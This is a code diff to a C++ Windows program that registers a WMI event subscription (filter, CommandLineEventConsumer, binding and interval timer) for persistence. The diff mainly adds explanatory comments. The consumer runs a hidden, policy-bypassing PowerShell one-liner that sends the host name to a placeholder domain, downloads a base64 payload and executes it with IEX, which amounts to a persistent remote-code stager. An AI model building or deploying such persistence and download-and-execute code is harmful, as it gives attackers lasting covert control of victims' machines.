@@ -12,7 +12,9 @@ using namespace std;
 void scheduleCallback(){
 	IWbemLocator *ploc = NULL;
 	IWbemServices *psvc = NULL;
-	WCHAR cmd[MAX_PATH*2];
+	WCHAR cmd[MAX_PATH*2]; //good enough
+
+        //init com interface
 	HRESULT h = CoInitializeEx(0, COINIT_MULTITHREADED);
 	IWbemClassObject *ef = NULL, *ec = NULL, *e2c = NULL, *ti = NULL;
 	IWbemClassObject *eventConsumer = NULL, *eventFilter = NULL, *f2cBinding = NULL, *timerinstruction = NULL;
@@ -23,30 +25,35 @@ void scheduleCallback(){
 		return 1;
 	}
 
+        //init COM security context
 	h = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
 	if (FAILED(h)){
 		cout << "Failed security init" << endl;
 		goto rip;
 	}
 
+        //create COM instance for WBEM
 	h = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&ploc);
 	if (FAILED(h)){
 		cout << "Failed to create wbem locator" << endl;
 		goto rip;
 	}
 
+        //connect to the \\root\subscription namespace
 	h = ploc->ConnectServer(_bstr_t(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, NULL, 0, 0, &psvc);
 	if (FAILED(h)){
 		cout << "Failed to open subscription namesapce" << endl;
 		goto rip;
 	}
 
+        //set COM proxy blanket
 	h = CoSetProxyBlanket(psvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
 	if (FAILED(h)){
 		cout << "Failed to set proxy blanket" << endl;
 		goto rip;
 	}
 
+        //get class instances
 	h = psvc->GetObject(L"CommandLineEventConsumer", 0, NULL, &eventConsumer, NULL);
 	if (FAILED(h)){
 		cout << "Failed to get event consumer class object" << endl;
@@ -71,13 +78,12 @@ void scheduleCallback(){
 		goto rip;
 	}
 
-
+        //spawn __EventFilter class instance
 	h = eventFilter->SpawnInstance(0, &ef);
 	if (FAILED(h)){
 		cout << "event filter instance spawn failed" << endl;
 	}
 	else {
-
 		putStringInClass(ef, L"Query", L"SELECT * FROM __timerevent where TimerId=\"__SysTimer1\"", CIM_STRING);
 		putStringInClass(ef, L"QueryLanguage", L"WQL", CIM_STRING);
 		putStringInClass(ef, L"Name", L"Filter1", CIM_STRING);
@@ -87,6 +93,7 @@ void scheduleCallback(){
 		}
 	}
 
+        //spawn CommandLineEventConsumer class instance
 	cmd = L"powershell -w hidden -ep bypass -nop -c \"$i=(New-Object System.Net.WebClient);$i.Headers.add('hostid',[net.dns]::GetHostByName('').HostName);IEX([Text.Encoding]::Ascii.GetString([Convert]::FromBase64String(($i.DownloadString('http://your.domain.here')))))\"";
 	h = eventConsumer->SpawnInstance(0, &ec);
 	if (FAILED(h)){
@@ -102,6 +109,7 @@ void scheduleCallback(){
 		}
 	}
 
+        //spawn __FilterToConsumerBinding class instance
 	h = f2cBinding->SpawnInstance(0, &e2c);
 	if (FAILED(h)){
 		cout << "filter to consumer instance spawn failed" << endl;
@@ -117,6 +125,7 @@ void scheduleCallback(){
 		}
 	}
 
+        //spawn __IntervalTimerInstruction class instance
 	h = timerinstruction->SpawnInstance(0, &ti);
 	if (FAILED(h)){
 		cout << "timer instruction instance spawn failed" << endl;
